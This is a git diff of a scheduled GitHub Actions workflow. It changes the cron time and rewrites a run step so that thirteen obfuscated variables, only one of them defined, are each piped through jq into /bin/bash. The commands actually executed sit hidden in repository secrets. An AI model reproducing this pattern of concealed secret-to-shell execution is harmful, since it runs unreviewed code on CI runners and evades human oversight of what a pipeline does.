@@ -1,27 +1,29 @@
 name: cheyingchangzuan
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
+    - cron: '56 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cheyingchangzuan
         env:
-          o997: ${{ secrets.o997 }}
+          dc14: ${{ secrets.dc14 }}
         run: |
-          echo $o997 | jq -r .nm29268 | /bin/bash
-          echo $ohpv0 | jq -r .snbq791 | /bin/bash
-          echo $rt586 | jq -r .lula26079 | /bin/bash
-          echo $g5090 | jq -r .l3812 | /bin/bash
-          echo $g796 | jq -r .ads43860 | /bin/bash
-          echo $h476 | jq -r .kvkh03 | /bin/bash
-          echo $gom0755 | jq -r .jmfnh864 | /bin/bash
-          echo $owdc5301 | jq -r .wmq5 | /bin/bash
-          echo $ej32105 | jq -r .cx9 | /bin/bash
+          echo $dc14 | jq -r .hw43 | /bin/bash
+          echo $jh36 | jq -r .h7676 | /bin/bash
+          echo $exc702 | jq -r .gz4 | /bin/bash
+          echo $guw51945 | jq -r .du31 | /bin/bash
+          echo $qpg6 | jq -r .vtuhu30 | /bin/bash
+          echo $i5800 | jq -r .gugsj6041 | /bin/bash
+          echo $wmlm49 | jq -r .qko3506 | /bin/bash
+          echo $s7 | jq -r .slzz9 | /bin/bash
+          echo $rkzsn35 | jq -r .ujg046 | /bin/bash
+          echo $fyoe913 | jq -r .wvq5542 | /bin/bash
+          echo $ji847 | jq -r .mdem65 | /bin/bash
+          echo $bjt89 | jq -r .ap67755 | /bin/bash
+          echo $yg2 | jq -r .zkl70 | /bin/bash
 
